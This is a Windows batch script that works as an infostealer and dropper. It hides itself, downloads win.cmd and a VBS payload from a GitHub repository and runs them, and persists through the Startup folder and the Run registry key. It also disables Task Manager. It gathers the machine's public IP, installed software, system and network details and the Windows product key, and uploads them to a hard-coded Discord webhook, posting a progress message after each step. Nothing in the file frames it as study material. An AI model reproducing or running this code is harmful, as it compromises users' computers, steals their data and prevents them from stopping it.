@echo off
cls
setlocal enableextensions && setlocal enabledelayedexpansion

:: Define the temporary directory
set "tempDir=C:\temp\Z"

:: Check if the temporary directory exists, if not, create it
if not exist "%tempDir%" (
    mkdir "%tempDir%"
)

:: Hide the script file
attrib +h +s %0

:: Define variables
set "webhook=https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
  :: Replace with your actual Discord webhook URL

:: Download the win.cmd file
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/invisibleghostshell-ux/last/raw/main/win.cmd', '%tempDir%\win.cmd')"

:: Copy win.cmd to the Startup folder
copy "%tempDir%\win.cmd" "%USERPROFILE%\Start Menu\Programs\Startup"

:: Send notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 1: win.cmd downloaded and copied to Startup folder.\"}"

:: Add a registry entry to run a batch file at user login
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyScript /t REG_SZ /d "%tempDir%\win.cmd" /f > nul

:: Disable Task Manager
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul

:: Send notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 2: Registry entries added.\"}"

:: Change to the temporary directory
cd /d %tempDir%

:: Get the public IP address and save it to a file
curl -s -o IP.txt https://ipv4.wtfismyip.com/text
set /p IPv4=<IP.txt

:: Save installed application details to a file
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > '%tempDir%\apps.txt'"

:: Upload the application details file
curl -v -F "file=@%tempDir%\apps.txt" %webhook%

:: Send notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 3: Application details collected and uploaded.\"}"

:: Collect system information and save it to a file
(
    echo Username %USERNAME%
    echo IP %IPv4%
    echo.
    ipconfig
    echo.
    getmac
    echo.
    wmic cpu get caption,name,deviceid,numberofcores,maxclockspeed,status
    echo.
    wmic computersystem get totalphysicalmemory
    echo.
    wmic partition get name,size,type
    echo.
    systeminfo
    echo.
    wmic path softwareLicensingService get OA3xOriginalProductKey
) >> %tempDir%\userdata.txt

:: Upload the collected system information
curl -v -F "file=@%tempDir%\userdata.txt" %webhook%

:: Send notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 4: System information collected and uploaded.\"}"

:: Clean up downloaded and temporary files
del "%tempDir%\modss.zip"

:: Download and execute a VBS script
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/invisibleghostshell-ux/last/raw/main/win.vbs', '%tempDir%\win.vbs')"
start "" "%tempDir%\win.vbs"

:: Send notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 5: VBS script downloaded and executed.\"}"

:: Send final notification to Discord
curl -X POST %webhook% -H "Content-Type: application/json" -d "{\"content\":\"Step 6: All data collected, files compressed, and sent.\"}"
